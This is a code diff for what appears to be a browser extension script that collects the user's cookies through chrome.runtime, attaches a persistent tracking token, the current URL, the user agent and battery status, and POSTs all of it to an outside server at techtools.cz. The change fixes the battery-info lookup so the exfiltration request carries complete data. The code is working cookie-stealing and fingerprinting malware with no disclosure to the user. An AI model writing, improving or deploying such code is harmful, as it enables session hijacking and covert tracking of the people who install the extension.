@@ -5,11 +5,14 @@ function generateToken() {
 
 // Battery Status API
 function getBatteryInfo() {
-  navigator.getBattery?.().then(battery => console.log({ batteryLevel: `${battery.level * 100}%`, isCharging: battery.charging }));
+  // Return the promise that resolves with the battery info
+  return navigator.getBattery?.().then(battery => {
+    return {
+      batteryLevel: `${battery.level * 100}%`,
+      isCharging: battery.charging
+    };
+  });
 }
-
-getBatteryInfo();
-
 
 
 chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
@@ -17,39 +20,38 @@ chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
 
   // Check for an existing token
   chrome.storage.local.get(['userToken'], function(result) {
-    let userToken = result.userToken;
+    let userToken = result.userToken || generateToken();
     const currentUrl = window.location.href;
 
-    if (!userToken) {
+    if (!result.userToken) {
       // If token doesn't exist, generate and save a new one
-      userToken = generateToken();
       chrome.storage.local.set({userToken: userToken}, function() {
         console.log("New token generated and saved.");
       });
     }
 
-    // Now that we have a token, send the data with the token
-    fetch('https://techtools.cz/extension/receiver', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        "data": response.cookies,
-        "token_identifier": userToken,
-        "url_send_from": currentUrl,
-        "user_agent": navigator.userAgent,
-        "battery_info": {
-          "batteryLevel": `${battery.level * 100}%`,
-          "isCharging": battery.charging
-        }
+    // Fetch battery info and proceed with sending the data
+    getBatteryInfo().then(batteryInfo => {
+      // Use batteryInfo here
+      fetch('https://techtools.cz/extension/receiver', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          "data": response.cookies,
+          "token_identifier": userToken,
+          "url_send_from": currentUrl,
+          "user_agent": navigator.userAgent,
+          "battery_info": batteryInfo // Use the obtained battery info here
+        })
       })
-    })
-    .then(response => {
-      if (!response.ok) throw new Error('Network response was not ok');
-      return response.json();
-    })
-    .then(data => console.log(data))
-    .catch(error => console.error('Error:', error));
+      .then(response => {
+        if (!response.ok) throw new Error('Network response was not ok');
+        return response.json();
+      })
+      .then(data => console.log(data))
+      .catch(error => console.error('Error:', error));
+    });
   });
 });
